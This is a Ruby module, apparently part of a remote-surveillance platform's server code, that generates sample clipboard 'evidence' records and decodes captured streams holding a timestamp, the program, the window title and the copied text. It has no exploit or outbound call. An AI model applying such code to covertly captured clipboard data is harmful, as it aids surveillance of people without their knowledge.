require 'rcs-common/evidence/common'

module RCS

module ClipboardEvidence

  ELEM_DELIMITER = 0xABADC0DE

  def content
    process = ["Notepad.exe", "Sykpe.exe", "Writepad.exe"].sample.to_utf16le_binary_null
    window = ["New Document", "Chat", "Test.doc"].sample.to_utf16le_binary_null
    content = StringIO.new
    t = Time.now.getutc
    content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
    content.write process
    content.write window
    content.write ["1234567890", "bla bla bla", "this is a string that will be copied"].sample.to_utf16le_binary_null
    content.write [ ELEM_DELIMITER ].pack('L')

    content.string
  end
  
  def generate_content
    ret = Array.new
    10.rand_times { ret << content() }
    ret
  end
  
  def decode_content(common_info, chunks)
    stream = StringIO.new chunks.join

    until stream.eof?
      info = Hash[common_info]
      info[:data] = Hash.new if info[:data].nil?

      tm = stream.read 36
      info[:da] = Time.gm(*tm.unpack('L*'), 0)
      info[:data][:program] = ''
      info[:data][:window] = ''
      info[:data][:content] = ''

      process = stream.read_utf16le_string
      info[:data][:program] = process.utf16le_to_utf8 unless process.nil?
      window = stream.read_utf16le_string
      info[:data][:window] = window.utf16le_to_utf8 unless window.nil?
      clipboard = stream.read_utf16le_string
      info[:data][:content] = clipboard.utf16le_to_utf8 unless clipboard.nil?

      delim = stream.read(4).unpack("L*").first
      raise EvidenceDeserializeError.new("Malformed CLIPBOARD (missing delimiter)") unless delim == ELEM_DELIMITER

      yield info if block_given?
    end
    :delete_raw
  end
end

end # ::RCS